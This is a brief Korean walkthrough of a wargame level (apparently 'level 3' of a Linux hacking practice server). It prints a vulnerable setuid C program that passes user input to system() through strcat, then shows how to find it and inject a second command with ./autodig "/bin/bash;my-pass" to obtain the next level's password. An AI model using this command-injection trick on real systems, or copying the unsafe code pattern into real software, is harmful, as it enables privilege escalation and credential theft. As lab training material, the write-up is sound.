level 3
===
1. 일단 ls -a명령어를 통해 directory안의 파일을 확인한다. 
2. directory안의 hint파일을 vi hint명령어를 입력해서 확인한다. 그러면 다음과 같이 적혀져 있다. 

다음 코드는 autodig의 소스이다.
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

int main(int argc, char **argv){
    char cmd[100];

    if(argc!=2){
        printf("Auto Digger Version 0.9\n");
        printf("Usage : %s host/n", argv[0]);
        exit(0);
    }

    strcpy(cmd, "dig @");
    strcat(cmd, argv[1]);
    strcat(cmd, "version.bind chaos txt");

    system(cmd);

}
이를 이용하여 level4이 권한을 열어라.

more hints.
-동시에 여러 명령어를 사용하려먼?
-문자열 형태로 명령어를 전달하려면?
3. find / -user level4 -perm -4300 명령어로 검색해서 파일을 찾아보면 autodig파일을 찾을 수 있다. 
4. cd /bin에 접근해서 autodig파일을 실행하면 level4의 password를 알 수 있다. 
5. ./autodig "/bin/bash;my-pass" 명령어를 입력해서 level4의 password를 알아낸다. <두 개의명령어를 동시에 입력하려면, ';'을 사용하면 되고, 문자열 형태로 명령어를 전달하려면 큰따옴표를 사용하여야 한다.>